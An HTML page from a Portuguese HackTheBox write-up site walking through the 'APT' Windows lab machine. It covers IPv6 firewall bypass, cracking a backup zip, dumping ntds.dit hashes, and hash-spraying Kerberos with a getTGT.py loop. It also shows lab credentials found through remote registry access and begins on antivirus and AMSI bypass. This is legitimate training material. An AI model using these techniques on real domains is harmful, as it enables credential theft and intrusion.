@@ -1,0 +1,556 @@
+<!DOCTYPE HTML>
+<html lang="pt" class="sidebar-visible no-js navy">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>HTB-Windows-Insane-APT - WriteUps HackTheBox - by JavaliMZ</title>
+
+
+        <!-- Custom HTML head -->
+        <!-- Content here gets appended to the <html><head> of all the pages -->
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+        <script
+        	async
+        	src='https://www.googletagmanager.com/gtag/js?id=G-ZCM4NEDCZB'
+        ></script>
+        <script>
+        	window.dataLayer = window.dataLayer || []; function
+        	gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config',
+        	'G-ZCM4NEDCZB');
+        </script>
+        <!-- Custom HTML head: Twitter support -->
+        <script
+        	async
+        	src='https://platform.twitter.com/widgets.js'
+        	charset='utf-8'
+        ></script>
+        
+        <meta
+        	name='google-site-verification'
+        	content='g05a2qliKESUMKBSl7XG8sosQoaFtDugS6F9MlUbe1Y'
+        />
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="../favicon.svg">
+        <link rel="shortcut icon" href="../favicon.png">
+        <link rel="stylesheet" href="../css/variables.css">
+        <link rel="stylesheet" href="../css/general.css">
+        <link rel="stylesheet" href="../css/chrome.css">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../highlight.css">
+        <link rel="stylesheet" href="../tomorrow-night.css">
+        <link rel="stylesheet" href="../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="../theme/css/additional.css">
+
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "navy";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('navy')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item "><a href="../index.html"><strong aria-hidden="true">1.</strong> Introdução</a></li><li class="chapter-item expanded "><a href="../Windows.html"><strong aria-hidden="true">2.</strong> Máquinas Windows</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../HTB/HTB-Windows-Easy-Omni.html"><strong aria-hidden="true">2.1.</strong> HTB-Windows-Easy-Omni</a></li><li class="chapter-item "><a href="../HTB/HTB-Windows-Easy-Sauna.html"><strong aria-hidden="true">2.2.</strong> HTB-Windows-Easy-Sauna</a></li><li class="chapter-item "><a href="../HTB/HTB-Windows-Medium-Resolute.html"><strong aria-hidden="true">2.3.</strong> HTB-Windows-Medium-Resolute</a></li><li class="chapter-item "><a href="../HTB/HTB-Windows-Medium-Cascade.html"><strong aria-hidden="true">2.4.</strong> HTB-Windows-Medium-Cascade</a></li><li class="chapter-item "><a href="../HTB/HTB-Windows-Hard-Blackfield.html"><strong aria-hidden="true">2.5.</strong> HTB-Windows-Hard-Blackfield</a></li><li class="chapter-item "><a href="../HTB/HTB-Windows-Insane-Bankrobber.html"><strong aria-hidden="true">2.6.</strong> HTB-Windows-Insane-Bankrobber</a></li><li class="chapter-item expanded "><a href="../HTB/HTB-Windows-Insane-APT.html" class="active"><strong aria-hidden="true">2.7.</strong> HTB-Windows-Insane-APT</a></li></ol></li><li class="chapter-item "><a href="../Linux.html"><strong aria-hidden="true">3.</strong> Máquinas Linux</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../HTB/HTB-Linux-Easy-Pandora.html"><strong aria-hidden="true">3.1.</strong> HTB-Linux-Easy-Pandora</a></li><li class="chapter-item "><a href="../HTB/HTB-Linux-Easy-Precious.html"><strong aria-hidden="true">3.2.</strong> HTB-Linux-Easy-Precious</a></li><li class="chapter-item "><a href="../HTB/HTB-Linux-Hard-Falafel.html"><strong aria-hidden="true">3.3.</strong> HTB-Linux-Hard-Falafel</a></li></ol></li><li class="chapter-item "><a href="../CiberSeguranca.html"><strong aria-hidden="true">4.</strong> Trabalhos do Curso de Ciber Segurança</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../CursoCiberSeguranca/Trabalho2/Trabalho2.html"><strong aria-hidden="true">4.1.</strong> Acesso Remoto (SSH)</a></li><li class="chapter-item "><a href="../CursoCiberSeguranca/Trabalho3/Trabalho3.html"><strong aria-hidden="true">4.2.</strong> Configuração avançada de um servidor SSH</a></li><li class="chapter-item "><a href="../CursoCiberSeguranca/Trabalho5/Trabalho5.html"><strong aria-hidden="true">4.3.</strong> Servidor Web com nginx e virtualhost</a></li><li class="chapter-item "><a href="../CursoCiberSeguranca/SELinux/TrabalhoSELinux.html"><strong aria-hidden="true">4.4.</strong> SELinux</a></li><li class="chapter-item "><a href="../CursoCiberSeguranca/Trabalho9SSL/Trabalho9SSL.html"><strong aria-hidden="true">4.5.</strong> HTTPS - SSL com NGINX</a></li></ol></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">WriteUps HackTheBox - by JavaliMZ</h1>
+
+                    <div class="right-buttons">
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <ol>
+<li><a href="#resolu%C3%A7%C3%A3o-da-m%C3%A1quina-apt">Resolução da máquina <strong>APT</strong></a> 1. <a href="#m%C3%A1quina-insane-hacktheboxcom">Máquina Insane (hackthebox.com)</a> 2. <a href="#by-javalimz---27092021">by <strong><em>JavaliMZ</em></strong> - 27/09/2021</a></li>
+<li><a href="#introdu%C3%A7%C3%A3o">Introdução</a></li>
+<li><a href="#enumera%C3%A7%C3%A3o">Enumeração</a>
+<ol>
+<li><a href="#nmap">Nmap</a>
+<ol>
+<li><a href="#porta-80">Porta 80</a></li>
+<li><a href="#porta-135">Porta 135</a></li>
+</ol>
+</li>
+<li><a href="#firewall">Firewall</a>
+<ol>
+<li><a href="#ioxidresolver">IOXIDResolver</a></li>
+</ol>
+</li>
+<li><a href="#nmap-1">Nmap</a></li>
+<li><a href="#smb">SMB</a></li>
+<li><a href="#gettgtpy">getTGT.py</a></li>
+<li><a href="#regpy">reg.py</a></li>
+</ol>
+</li>
+<li><a href="#escalada-de-privil%C3%A9gios">Escalada de Privilégios</a>
+<ol>
+<li><a href="#winpeas64exe">winPEAS64.exe</a>
+<ol>
+<li><a href="#bypass-4msi">Bypass-4MSI</a>
+<ol>
+<li><a href="#exemplo-com-a-pr%C3%B3rpia-m%C3%A1quina-alvo"><em>exemplo com a prórpia máquina alvo:</em></a></li>
+</ol>
+</li>
+<li><a href="#invoke-binary">Invoke-Binary</a></li>
+</ol>
+</li>
+<li><a href="#responder">responder</a></li>
+<li><a href="#mscmdrunexe">MsCmdRun.exe</a></li>
+<li><a href="#secretsdumppy">Secretsdump.py</a></li>
+</ol>
+</li>
+</ol>
+<p><img src="Assets/HTB-Windows-Insane-APT/icon.webp" alt="" /></p>
+<img src="https://img.shields.io/badge/APT-HackTheBox-green?style=plastic" width="200">
+<h1 id="resolução-da-máquina-apt"><a class="header" href="#resolução-da-máquina-apt">Resolução da máquina <strong>APT</strong></a></h1>
+<h4 id="máquina-insane-hacktheboxcom"><a class="header" href="#máquina-insane-hacktheboxcom">Máquina Insane (hackthebox.com)</a></h4>
+<h4 id="by-javalimz---27092021"><a class="header" href="#by-javalimz---27092021">by <strong><em>JavaliMZ</em></strong> - 27/09/2021</a></h4>
+<hr />
+<hr />
+<h1 id="introdução"><a class="header" href="#introdução">Introdução</a></h1>
+<p>Bem-vindo para mais um writeup, desta vez uma máquina Insane! É uma máquina Windows, Em que iremos ter bastantes desafios interessantes...</p>
+<ul>
+<li>Iremos burlar o firewall por IPv6</li>
+<li>Iremos recuperar um backup.zip dentro de uma basta partilhada contendo um ntds.dit e um SYSTEM (base de dados de todo um domain controller, e seu ficheiro SYSTEM para conseguir decifrá-lo)</li>
+<li>O resultado do ponte anterior será um monte de usuários e credenciais, todos eles inválidos.</li>
+<li>Iremos enumerar os usuários existentes com GetNPUsers.py (Por Kerberos)</li>
+<li>Iremos tentar ver se um dos hashes do ntds.dit antigo funciona com os usuários existentes que recuperamos. Esse passo terá que ser por Kerberos também porque o servidor samba está bloqueando o número de tentativas.</li>
+<li>Iremos movimentar-nos remotamente pelo registo da máquina alvo onde se vai descobrir umas credenciais, com capacidade de &quot;winrm&quot;</li>
+<li>Vamos ver que a máquina foi modificada para aceitar autenticação por NTLMv1, e que é esse o protocolo de authenticação por defeito.</li>
+<li>Iremos pilhar o hash NTLMv1 de um usuário administrador ao forçar um escaneamento de virus com o windows defender a um ficheiro que vamos partilhar.</li>
+<li>vamos converter o hash NTLMv1 para um hash NTLMv2 via online</li>
+<li>Com as novas credenciais de administrador sem capacidade de psexec nem escrita no samba (sem nenhum shell), vamos tratar de extrair todos os hashes do DC através do protocolo DRSUAPI e DCERPC</li>
+</ul>
+<h1 id="enumeração"><a class="header" href="#enumeração">Enumeração</a></h1>
+<h2 id="nmap"><a class="header" href="#nmap">Nmap</a></h2>
+<p>Como sempre, vamos começar por enumerar as portas abertas da máquina alvo...</p>
+<p><img src="Assets/HTB-Windows-Insane-APT/enum-nmap.png" alt="Nmap" /></p>
+<p>Esta máquina tem apenas 2 portas abertas! E para não engonhar, para não ter um relatório enorme, vou ir mais direto ao assunto...</p>
+<h3 id="porta-80"><a class="header" href="#porta-80">Porta 80</a></h3>
+<p>O servidor web tem paginas de internet mas não se consegue entrar por ai... Apenas há uma informação de relevo, mas que nem sequer é preciso entrar pelo browser para ver isso</p>
+<pre><code class="language-bash">whatweb http://10.10.10.213/ | sed 's/, /\n/g'
+
+#&gt;  http://10.10.10.213/ [200 OK] Bootstrap
+#&gt;  Country[RESERVED][ZZ]
+#&gt;  Email[sales@gigantichosting.com]
+#&gt;  HTML5
+#&gt;  HTTPServer[Microsoft-IIS/10.0]
+#&gt;  IP[10.10.10.213]
+#&gt;  JQuery
+#&gt;  Microsoft-IIS[10.0]
+#&gt;  Script[application/x-javascript,text/javascript]
+#&gt;  Title[Gigantic Hosting | Home]
+</code></pre>
+<p>O email pode ajudar mais tarde (sales@gigantichosting.com)...</p>
+<h3 id="porta-135"><a class="header" href="#porta-135">Porta 135</a></h3>
+<p>Já que o servidor Web não nos dá acesso à máquina, só ja temos mais este ponto...</p>
+<pre><code class="language-bash">rcpclient 10.10.10.213
+rcpclient 10.10.10.213 -N-U 'null' -N
+rcpclient 10.10.10.213 -U 'guest' -N
+rcpclient 10.10.10.213 -U 'anonymous' -N
+rcpclient 10.10.10.213 -U '%'
+</code></pre>
+<p>Todas as tentativas de conexão falharam... e agora?! Poderíamos tentar analisar portas UDP, visto que o scan que foi feito com o NMAP foi apenas portas TCP. Mas não há portas UDP abertas. O que acontece é que as portas devem estar bloqueadas com regras de firewall.</p>
+<h2 id="firewall"><a class="header" href="#firewall">Firewall</a></h2>
+<p>Um problema comum entre os administradores de redes é que só estão habituados a trabalhar com IPv4. Pode acontecer que não liguem às regras por IPv6! É exatamente esse o ponto desta máquina. Para burlar o firewall, apenas temos de arranjar formas de descobrir o IPv6 da máquina.</p>
+<p>Para isso, com a ajuda do serviço RPC que está aberto, podemos chamar uma função, ServerAlive2() do objecto IObjectExporter sem estar autenticado. Esse comando devolve o que é chamado de OXID resolution, que é o que indica ao cliente por que via se pode conectar aos demais objectos. As informações que nos dá é só o nome da máquina, e os seus IPs (Tanto IPv4 como o IPv6). Basicamente, é o comparado ao Ping.</p>
+<ul>
+<li>O ping é o que permite determinar a responsividade do alvo através do protocolo ARP, e</li>
+<li>IObjectExporter::ServerAlive2 é o que permite receber os IPs do alvo através do protocolo DCERPC/IOXIDResolver.</li>
+</ul>
+<blockquote>
+<p><strong>!!ATENÇÃO!!</strong> Todo o parágrafo acima é para se ler de relance... Porque, eu não percebi tudo do que li, e certamente falta muita informação...</p>
+</blockquote>
+<h3 id="ioxidresolver"><a class="header" href="#ioxidresolver">IOXIDResolver</a></h3>
+<p>Para conseguir saber o IPv6, por RPC, basta usar esta ferramenta</p>
+<blockquote>
+<p>https://github.com/mubix/IOXIDResolver</p>
+</blockquote>
+<pre><code class="language-bash">git clone https://github.com/mubix/IOXIDResolver
+cd IOXIDResolver
+
+python IOXIDResolver.py -t 10.10.10.213
+#&gt;  [*] Retrieving network interface of 10.10.10.213
+#&gt;  Address: apt
+#&gt;  Address: 10.10.10.213
+#&gt;  Address: dead:beef::b885:d62a:d679:573f
+#&gt;  Address: dead:beef::215
+
+ping6 -c 1 dead:beef::b885:d62a:d679:573f
+</code></pre>
+<p>O ping mostra que a máquina responde. A partir de agora, vamos começar novamente do zero a enumerar a máquina.</p>
+<h2 id="nmap-1"><a class="header" href="#nmap-1">Nmap</a></h2>
+<pre><code class="language-bash">nmap -p- --open -n -Pn -6 dead:beef::b885:d62a:d679:573f -oG enumeration/allPorts-IPv6 -vvv --min-rate 5000
+
+extractPorts enumeration/allPorts-IPv6
+
+#&gt;  Enumeração das portas:
+#&gt;
+#&gt;   [*]    IP Address: dead:beef::b885:d62a:d679:573f
+#&gt;   [*]    Open Ports: 53, 80, 88, 135, 389, 445, 464, 593, 636, 5985, 9389, 47001, 49664, 49665, 49666, 49667, 49669, 49670, 49673, 49685, 49693
+
+nmap -p53,80,88,135,389,445,464,593,636,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,49685,49693 -6 dead:beef::b885:d62a:d679:573f -sC -sV -vvv -oN enumeration/nmap-a-IPv6.txt
+
+#&gt;  ---skipped--
+#&gt;  53/tcp    open  domain       syn-ack Simple DNS Plus
+#&gt;  80/tcp    open  http         syn-ack Microsoft IIS httpd 10.0
+#&gt;  88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2021-09-27 20:09:53Z)
+#&gt;  135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
+#&gt;  389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+#&gt;  445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+#&gt;  464/tcp   open  kpasswd5?    syn-ack
+#&gt;  593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
+#&gt;  636/tcp   open  ssl/ldap     syn-ack Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+#&gt;  5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+#&gt;  9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
+#&gt;  47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+#&gt;  49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
+#&gt;  49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
+#&gt;  49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
+#&gt;  49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
+#&gt;  49669/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
+#&gt;  49670/tcp open  msrpc        syn-ack Microsoft Windows RPC
+#&gt;  49673/tcp open  msrpc        syn-ack Microsoft Windows RPC
+#&gt;  49685/tcp open  msrpc        syn-ack Microsoft Windows RPC
+#&gt;  49693/tcp open  msrpc        syn-ack Microsoft Windows RPC
+</code></pre>
+<p>Agora sim! Temos informações. Parece ser um AD/DC (Active Directory / Domain Controller). E ainda sabemos o domain (htb.local)</p>
+<p>Com essas informações, e para termos menos problemas com as diversas ferramentas por causa do IPv6, vamos colocar essas informações no /etc/hosts.</p>
+<pre><code class="language-bash">echo -e &quot;dead:beef::b885:d62a:d679:573f\tapt apt.htb.local htb.local&quot; &gt;&gt; /etc/hosts
+</code></pre>
+<h2 id="smb"><a class="header" href="#smb">SMB</a></h2>
+<p>Seguindo os passos habituais, que no meu caso é tentar obter credenciais via RPC com <strong>&quot;enumdomusers&quot;</strong>, para depois tentar um AS-REP Roasting Attack, ou até mesmo tentar esse mesmo ataque à bruta com <strong>&quot;kerbrute&quot;</strong>, não obtemos resultados conclusivos. O serviço rpc não está disponível para usuários não autenticados. E o kerbrute às escuras não encontra nada. Passamos para o serviço Samba.</p>
+<pre><code class="language-bash">crackmapexec smb apt
+#&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
+
+crackmapexec smb apt --shares
+#&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
+#&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] Error enumerating shares: SMB SessionError: 0x5b
+
+crackmapexec smb apt --shares -u '' -p ''
+#&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
+#&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [-] htb.local\: STATUS_ACCESS_DENIED
+#&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] Enumerated shares
+#&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              Share           Permissions     Remark
+#&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              -----           -----------     ------
+#&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              backup          READ
+#&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              IPC$                            Remote IPC
+#&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              NETLOGON                        Logon server share
+#&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              SYSVOL                          Logon server share
+</code></pre>
+<p>Até que enfim vemos algo da máquina! Uma pasta partilhada de backup... Promissor...</p>
+<pre><code class="language-bash">smbclient \\\\apt\\backup -U '' -N
+smb: \&gt; dir
+
+#&gt;  ---skipped---
+#&gt;  backup.zip                          A 10650961  Thu Sep 24 08:30:32 2020
+
+smb: \&gt; get backup.zip
+
+
+unzip backup.zip
+</code></pre>
+<p>O ficheiro está protegido por palavra passe... Podemos tentar romper a palavra passe por força bruta com o dicionário <strong><em>rockyou.txt</em></strong> da seguinte forma:</p>
+<pre><code class="language-bash">zip2johh backup.zip &gt; hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+john hash --show
+
+#&gt;  backup.zip:iloveyousomuch::backup.zip:Active Directory/ntds.jfm, registry/SECURITY, Active Directory/ntds.dit:backup.zip
+
+unzip backup.zip  # iloveyousomuch
+</code></pre>
+<p>O conteúdo do ficheiro zip é espetacular! Tem um ficheiro SYSTEM e um ficheiro ntds.nit. Com esses dois ficheiros é possível extrair todos os hashes de um Domain Controller.</p>
+<pre><code class="language-bash">secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL &gt; contents/secretsdump.out
+</code></pre>
+<p>O output é enorme. Deve ser a simulação da GOOGLECORP ou coisa parecida LOOOL... 8005 linhas!!</p>
+<pre><code class="language-bash">cat secretsdump.out | grep aad | awk -F ':' '{print$1}' &gt; users
+cat secretsdump.out | grep aad | awk -F ':' '{print$4}' &gt; hashes
+</code></pre>
+<p>Temos agora dois ficheiros, um de users, e um de hashes. Vamos primeiro enumerar os users... Para isso, nada melhor que o kerberos para enumerar os users existentes. Vamos tentar efetuar um AS-REP Roasting Attack. Se o user existe, a resposta vai ser que o usuário não tem pre autenticação ativada, e se tivermos um hash kerberos, bem podemos tentar crackeá-lo...</p>
+<pre><code class="language-bash">GetNPUsers.py htb.local/ -no-pass -usersfile users | grep -v &quot;not found&quot;
+#&gt;  [-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+#&gt;  [-] User APT$ doesn't have UF_DONT_REQUIRE_PREAUTH set
+#&gt;  [-] User henry.vinson doesn't have UF_DONT_REQUIRE_PREAUTH set
+</code></pre>
+<p>Temos 3 usuários válidos. Mas não conseguimos obter nenhum TGT. A lista de Hashes que temos poderá ter (e confirmo já que tem lol) um hash válido para 1 dos usuários. Pode estar a simular um usuário que mudou de nome mas não mudou de password. Isto pode ter facilmente verificado através de crackmapexec</p>
+<pre><code class="language-bash">crackmapexec smb apt -u valide_users -H hashes
+</code></pre>
+<p>O problema é que a máquina alvo possui algo que impede ataques por força bruta ao serviço Samba! Depois de umas 50 tentativas, a máquina bloqueia o nosso IP e é preciso reiniciar a máquina...</p>
+<p>Posto isso, podemos tentar receber um TGT com username e um HASH (ou uma password).</p>
+<h2 id="gettgtpy"><a class="header" href="#gettgtpy">getTGT.py</a></h2>
+<p>Existe uma outra utilidade do Impacket que se chama <strong>getTGT.py</strong> e que faz este serviço. O problema é que faz apenas e só uma petição. Não dá para fazer por força bruta com recurso a dicionário. Bem, isto resolve-se com bash, um <strong>for loop</strong> e paralelizar as petições. Depois ainda há outro problema. No output, não temos informações do nome ou do hash que está a ser usado. Para contornar isso, decidi enviar cada output em separado, e cujo o nome do ficheiro é simplesmente o hash... O output correcto informa que foi criado um ficheiro qualquer com o formato &quot;username.ccache&quot;. Depois com um find e um grep, é fácil recuperar o hash e o seu username...</p>
+<pre><code class="language-bash">getTGT.py -hashes :2b576acbe6bcfda7294d6bd18041b8fe htb.local/henry.vinson
+
+#&gt;  Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
+#&gt;  Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
+
+mkdir getTGT_dir
+for hash in $(cat hashes); do getTGT.py -hashes :$hash htb.local/henry.vinson &gt; getTGT_dir/$hash &amp;; done
+cd getTGT_dir
+find . -type f | xargs grep &quot;henry&quot;
+#&gt; ./e53d87d42adaa3ca32bdb34a876cbffb:[*] Saving ticket in henry.vinson.ccache
+</code></pre>
+<blockquote>
+<p>henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb</p>
+</blockquote>
+<p>Supostamente, este ficheiro.ccache é o tal TGT que dá para usar para fazer login depois. Mas não consegui. Penso que não consegui porque op usuário não tem capacidade de &quot;psexec&quot;. Mas não tenho a certeza porque foi a primeira vez que tentei...</p>
+<p>vamos validar as credenciais com crackmapexec (atenção que se tem de sair da pasta o existe o nome do ficheiro igual ao hash, porque o crackmapexec prioriza nomes de ficheiros, perdi 5 minutos à conta disto looool)</p>
+<p><img src="Assets/HTB-Windows-Insane-APT/crackmapexec_henry.png" alt="crackmapexec henry.vinson" /></p>
+<h2 id="regpy"><a class="header" href="#regpy">reg.py</a></h2>
+<p>Agora vem outra parte tricky! Não me é possível ter uma shell com evil-winrm, não tenho capacidade de escrita em nenhum recurso compartilhado. Mas ainda se pode fazer coisas... o reg.exe do windows é um programa que permite ver/alterar registos do windows pela linha de comando. É quase tão poderoso quando o regedit.exe, que é a aplicação GUI para ver/alterar os registos. Com esta máquina, descobri que o programa reg.exe tem capacidade de ver e alterar registos remotamente, para que os administradores possam trabalhar comodamente de chinelos nos seus lares loool. Fora de brincadeira, isso é bem prático para administradores, e para atacantes também =)</p>
+<p>o reg.py, é outro recurso do Impacket, que simula uma petição do reg.exe com as credenciais e tudo isso, como se eu estivesse a executar o comando do windows devidamente autenticado... Indo direto ao que nos interessa, podemos encontrar isto:</p>
+<p><img src="Assets/HTB-Windows-Insane-APT/reg_henry_vinson_adm.png" alt="reg.py credenciais de henry.vinson_adm" /></p>
+<blockquote>
+<p>henry.vinson_adm:G1#Ny5@2dvht</p>
+</blockquote>
+<p>Vamos validar com crackmapexec...</p>
+<pre><code class="language-bash">crackmapexec smb apt -u 'henry.vinson_adm' -p 'G1#Ny5@2dvht'
+#&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
+#&gt;  SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\henry.vinson_adm:G1#Ny5@2dvht
+</code></pre>
+<p>De referir que o crackmapexec por IPv6 (o pequeno apt que se vê, é o IPv6 que se encontra no /etc/hosts) só funciona por smb. Sempre que se tenha novas credenciais e que quisermos verificar se temos capacidade de psexec ou evil-winrm, temos de fazê-lo á mão mesmo.</p>
+<p><img src="Assets/HTB-Windows-Insane-APT/winrm_henry_adm.png" alt="Evil-WinRM henry.vinson_adm" /></p>
+<h1 id="escalada-de-privilégios"><a class="header" href="#escalada-de-privilégios">Escalada de Privilégios</a></h1>
+<p>Agora que temos acesso à máquina, podemos enumerar usuários locais. Com o commando <strong><em>net localgroup &quot;Remote Management Users&quot;</em></strong>, dá para perceber que apenas o nosso usuário actual tem permissões de psexec, ou evil-winrm. Já sabemos então que mesmo o Adminstrator local não tem capacidade de psexec ou evil-winrm.</p>
+<p>Vou usar a ferramenta winPEAS64.exe para enumerar a máquina mais rápidamente</p>
+<h2 id="winpeas64exe"><a class="header" href="#winpeas64exe">winPEAS64.exe</a></h2>
+<pre><code class="language-bash"># kali
+wget https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
+
+# Target Machine
+upload /home/javali/CaptureTheFlag/HackTheBox/contents/winPEASx64.exe
+.\winPEASx64.exe
+#&gt;  Program 'winPEASx64.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted software...skipped...
+</code></pre>
+<p>Problemas! O antivirus está ativo. É raro ver Domains Controllers com antivirus ativo por causa de rendimentos. Mas já ques está activo, temos de lidar com isso...</p>
+<p>Para burlar o antivirus, vou usar 2 funções, que já vêm pré-carregadas no evil-winrm (assim fica fácil...)</p>
+<h3 id="bypass-4msi"><a class="header" href="#bypass-4msi">Bypass-4MSI</a></h3>
+<p>Para rodar comando estranhos no powershell, é preciso primeiro burlar uma função que existe no powershell que analisa a string antes de executar o comando. Essa função tem como nome: Interface de verificação antimalware (AMSI)</p>
